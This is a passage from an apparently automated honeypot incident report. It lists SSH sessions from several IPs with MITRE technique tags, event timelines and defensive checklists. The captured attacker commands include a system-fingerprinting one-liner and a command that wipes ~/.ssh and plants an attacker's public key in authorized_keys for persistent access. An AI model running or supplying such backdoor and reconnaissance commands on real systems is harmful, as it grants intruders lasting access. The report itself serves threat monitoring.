| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:14:11` | `cowrie.session.connect` |
| `2026-09-29 01:14:11` | `cowrie.client.version` |
| `2026-09-29 01:14:11` | `cowrie.client.kex` |
| `2026-09-29 01:14:12` | `cowrie.login.success` |
| `2026-09-29 01:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.224.97[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.224.97[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802a756e4af3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:15 |
| **Last Seen** | 2026-09-29 01:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:15:36` | `cowrie.session.connect` |
| `2026-09-29 01:15:36` | `cowrie.client.version` |
| `2026-09-29 01:15:36` | `cowrie.client.kex` |
| `2026-09-29 01:15:37` | `cowrie.login.success` |
| `2026-09-29 01:15:38` | `cowrie.session.params` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.success` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:38` | `cowrie.command.input` |
| `2026-09-29 01:15:39` | `cowrie.log.closed` |
| `2026-09-29 01:15:40` | `cowrie.session.params` |
| `2026-09-29 01:15:40` | `cowrie.command.input` |
| `2026-09-29 01:15:40` | `cowrie.log.closed` |
| `2026-09-29 01:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5311067fc79d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.201[.]248` |
| **First Seen** | 2026-09-29 01:16 |
| **Last Seen** | 2026-09-29 01:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:16:52` | `cowrie.session.connect` |
| `2026-09-29 01:16:52` | `cowrie.client.version` |
| `2026-09-29 01:16:52` | `cowrie.client.kex` |
| `2026-09-29 01:16:54` | `cowrie.login.success` |
| `2026-09-29 01:16:55` | `cowrie.session.params` |
| `2026-09-29 01:16:55` | `cowrie.command.input` |
| `2026-09-29 01:16:55` | `cowrie.command.failed` |
| `2026-09-29 01:16:55` | `cowrie.log.closed` |
| `2026-09-29 01:16:56` | `cowrie.session.params` |
| `2026-09-29 01:16:56` | `cowrie.command.input` |
| `2026-09-29 01:16:57` | `cowrie.session.file_download` |
| `2026-09-29 01:16:57` | `cowrie.log.closed` |
| `2026-09-29 01:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.201[.]248` to AbuseIPDB if not already reported
- [ ] Block `45.78.201[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c627501da9b4

| Field | Detail |
|---|---|
| **Source IP** | `45.78.201[.]248` |
| **First Seen** | 2026-09-29 01:16 |
| **Last Seen** | 2026-09-29 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:16:57` | `cowrie.session.connect` |
| `2026-09-29 01:16:57` | `cowrie.client.version` |
| `2026-09-29 01:16:57` | `cowrie.client.kex` |
| `2026-09-29 01:16:58` | `cowrie.login.success` |
| `2026-09-29 01:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.201[.]248` to AbuseIPDB if not already reported
- [ ] Block `45.78.201[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34dee53da6d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.201[.]248` |
| **First Seen** | 2026-09-29 01:16 |
| **Last Seen** | 2026-09-29 01:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:16:59` | `cowrie.session.connect` |
| `2026-09-29 01:16:59` | `cowrie.client.version` |
| `2026-09-29 01:16:59` | `cowrie.client.kex` |
| `2026-09-29 01:17:01` | `cowrie.login.success` |
| `2026-09-29 01:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.201[.]248` to AbuseIPDB if not already reported
- [ ] Block `45.78.201[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e610bcee7c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:17 |
| **Last Seen** | 2026-09-29 01:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:17:24` | `cowrie.session.connect` |
| `2026-09-29 01:17:24` | `cowrie.client.version` |
| `2026-09-29 01:17:24` | `cowrie.client.kex` |
| `2026-09-29 01:17:24` | `cowrie.login.success` |
| `2026-09-29 01:17:25` | `cowrie.session.params` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.success` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:25` | `cowrie.command.input` |
| `2026-09-29 01:17:26` | `cowrie.log.closed` |
| `2026-09-29 01:17:27` | `cowrie.session.params` |
| `2026-09-29 01:17:27` | `cowrie.command.input` |
| `2026-09-29 01:17:27` | `cowrie.log.closed` |
| `2026-09-29 01:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f68f9c53098

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:19 |
| **Last Seen** | 2026-09-29 01:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:19:21` | `cowrie.session.connect` |
| `2026-09-29 01:19:21` | `cowrie.client.version` |
| `2026-09-29 01:19:21` | `cowrie.client.kex` |
| `2026-09-29 01:19:22` | `cowrie.login.success` |
| `2026-09-29 01:19:23` | `cowrie.session.params` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.success` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.command.input` |
| `2026-09-29 01:19:23` | `cowrie.log.closed` |
| `2026-09-29 01:19:24` | `cowrie.session.params` |
| `2026-09-29 01:19:24` | `cowrie.command.input` |
| `2026-09-29 01:19:24` | `cowrie.log.closed` |
| `2026-09-29 01:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824f5afa353b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:20 |
| **Last Seen** | 2026-09-29 01:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:20:48` | `cowrie.session.connect` |
| `2026-09-29 01:20:48` | `cowrie.client.version` |
| `2026-09-29 01:20:48` | `cowrie.client.kex` |
| `2026-09-29 01:20:49` | `cowrie.login.success` |
| `2026-09-29 01:20:50` | `cowrie.session.params` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.success` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:50` | `cowrie.command.input` |
| `2026-09-29 01:20:51` | `cowrie.log.closed` |
| `2026-09-29 01:20:52` | `cowrie.session.params` |
| `2026-09-29 01:20:52` | `cowrie.command.input` |
| `2026-09-29 01:20:52` | `cowrie.log.closed` |
| `2026-09-29 01:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2bf7118010

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:22 |
| **Last Seen** | 2026-09-29 01:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:22:12` | `cowrie.session.connect` |
| `2026-09-29 01:22:12` | `cowrie.client.version` |
| `2026-09-29 01:22:12` | `cowrie.client.kex` |
| `2026-09-29 01:22:13` | `cowrie.login.success` |
| `2026-09-29 01:22:14` | `cowrie.session.params` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.success` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.command.input` |
| `2026-09-29 01:22:14` | `cowrie.log.closed` |
| `2026-09-29 01:22:15` | `cowrie.session.params` |
| `2026-09-29 01:22:15` | `cowrie.command.input` |
| `2026-09-29 01:22:16` | `cowrie.log.closed` |
| `2026-09-29 01:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a3691c6b00

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:23 |
| **Last Seen** | 2026-09-29 01:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:23:35` | `cowrie.session.connect` |
| `2026-09-29 01:23:35` | `cowrie.client.version` |
| `2026-09-29 01:23:35` | `cowrie.client.kex` |
| `2026-09-29 01:23:37` | `cowrie.login.success` |
| `2026-09-29 01:23:38` | `cowrie.session.params` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.success` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.command.input` |
| `2026-09-29 01:23:38` | `cowrie.log.closed` |
| `2026-09-29 01:23:39` | `cowrie.session.params` |
| `2026-09-29 01:23:39` | `cowrie.command.input` |
| `2026-09-29 01:23:40` | `cowrie.log.closed` |
| `2026-09-29 01:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19d67857555

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:25 |
| **Last Seen** | 2026-09-29 01:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:25:01` | `cowrie.session.connect` |
| `2026-09-29 01:25:01` | `cowrie.client.version` |
| `2026-09-29 01:25:01` | `cowrie.client.kex` |
| `2026-09-29 01:25:02` | `cowrie.login.success` |
| `2026-09-29 01:25:03` | `cowrie.session.params` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.success` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:03` | `cowrie.command.input` |
| `2026-09-29 01:25:04` | `cowrie.log.closed` |
| `2026-09-29 01:25:05` | `cowrie.session.params` |
| `2026-09-29 01:25:05` | `cowrie.command.input` |
| `2026-09-29 01:25:05` | `cowrie.log.closed` |
| `2026-09-29 01:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33c97a1999c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 01:25 |
| **Last Seen** | 2026-09-29 01:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:25:01` | `cowrie.session.connect` |
| `2026-09-29 01:25:01` | `cowrie.client.version` |
| `2026-09-29 01:25:02` | `cowrie.client.kex` |
| `2026-09-29 01:25:02` | `cowrie.login.success` |
| `2026-09-29 01:25:02` | `cowrie.direct-tcpip.request` |
| `2026-09-29 01:25:02` | `cowrie.direct-tcpip.data` |
| `2026-09-29 01:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966797d14859

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:26 |
| **Last Seen** | 2026-09-29 01:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:26:30` | `cowrie.session.connect` |
| `2026-09-29 01:26:30` | `cowrie.client.version` |
| `2026-09-29 01:26:30` | `cowrie.client.kex` |
| `2026-09-29 01:26:31` | `cowrie.login.success` |
| `2026-09-29 01:26:32` | `cowrie.session.params` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.success` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:32` | `cowrie.command.input` |
| `2026-09-29 01:26:33` | `cowrie.log.closed` |
| `2026-09-29 01:26:34` | `cowrie.session.params` |
| `2026-09-29 01:26:34` | `cowrie.command.input` |
| `2026-09-29 01:26:34` | `cowrie.log.closed` |
| `2026-09-29 01:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16b29a88eaec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:28 |
| **Last Seen** | 2026-09-29 01:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:28:06` | `cowrie.session.connect` |
| `2026-09-29 01:28:06` | `cowrie.client.version` |
| `2026-09-29 01:28:06` | `cowrie.client.kex` |
| `2026-09-29 01:28:06` | `cowrie.login.success` |
| `2026-09-29 01:28:07` | `cowrie.session.params` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.success` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.command.input` |
| `2026-09-29 01:28:07` | `cowrie.log.closed` |
| `2026-09-29 01:28:08` | `cowrie.session.params` |
| `2026-09-29 01:28:08` | `cowrie.command.input` |
| `2026-09-29 01:28:09` | `cowrie.log.closed` |
| `2026-09-29 01:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
